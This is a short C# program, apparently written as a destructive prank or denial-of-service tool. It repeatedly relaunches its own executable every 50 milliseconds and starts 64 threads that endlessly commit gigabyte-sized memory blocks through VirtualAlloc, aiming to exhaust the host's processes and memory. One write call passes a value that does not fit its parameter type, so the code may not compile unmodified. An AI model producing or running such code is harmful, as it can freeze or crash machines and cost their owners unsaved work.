using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    const uint MEM_COMMIT             = 0x1000;
    const uint MEM_RESERVE            = 0x2000;
    const uint PAGE_READWRITE         = 0x04;

    static void Main()
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("=== MEMORY + PROCESS + THREAD APOCALYPSE ===");
        Console.ResetColor();

        // Keep spawning processes
        _ = new Thread(() =>
        {
            while (true)
            {
                try
                {
                    Process.Start(typeof(Program).Assembly.Location);
                }
                catch { }
                Thread.Sleep(50);
            }
        }) { IsBackground = true }.Start();

        // Memory eater threads
        for (int i = 0; i < 64; i++)
        {
            new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        // Try to allocate ~1GB chunks
                        for (int j = 0; j < 1024; j++)
                        {
                            var ptr = VirtualAlloc(IntPtr.Zero, new UIntPtr(1L << 30), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                            if (ptr != IntPtr.Zero)
                            {
                                // Optional: touch the memory (makes it really commit)
                                Marshal.WriteInt32(ptr, 0xDEADBEEF);
                            }
                        }
                    }
                    catch { }
                }
            })
            { IsBackground = true }.Start();
        }

        // Keep the main thread alive
        Thread.Sleep(Timeout.Infinite);
    }
}
